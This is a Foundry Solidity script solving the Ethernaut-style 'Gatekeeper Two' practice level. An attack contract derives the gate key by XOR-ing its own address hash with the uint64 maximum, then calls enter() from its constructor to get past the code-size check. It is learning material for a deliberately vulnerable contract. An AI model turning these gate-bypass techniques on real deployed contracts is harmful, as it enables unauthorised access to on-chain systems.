// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


/*
    This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

    Gate 1 Solution: Send from contract
    Gate 2 Solution: Contract code size must == 0. Send in constructor of contract
    Gate 3 Solution: Using bitwise operations

 */
contract GateKeeperTwoAttack {
    GatekeeperTwo gatekeeper = GatekeeperTwo(0xA4D41fF4AB0F5Ffe164b64155Eba81c5222d50F5);

    constructor() {

        // Solution 1:
        // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        // a = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
        // b = uint64(_gateKey)
        // c = type(uint64).max
        // a ^ a ^ b = b = a ^ c
        // bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

        // Solution 2: Using bitwise NOT operator
        // bytes8 myKey = bytes8(~a);

        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter(myKey);
    }
}

contract GateKeeperTwoSolution is Script {

    function run() external {
        // 1 send from contract
        // 2 Specify gas
        // 3 cast msg.sender
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GateKeeperTwoAttack();
        vm.stopBroadcast();
    }
}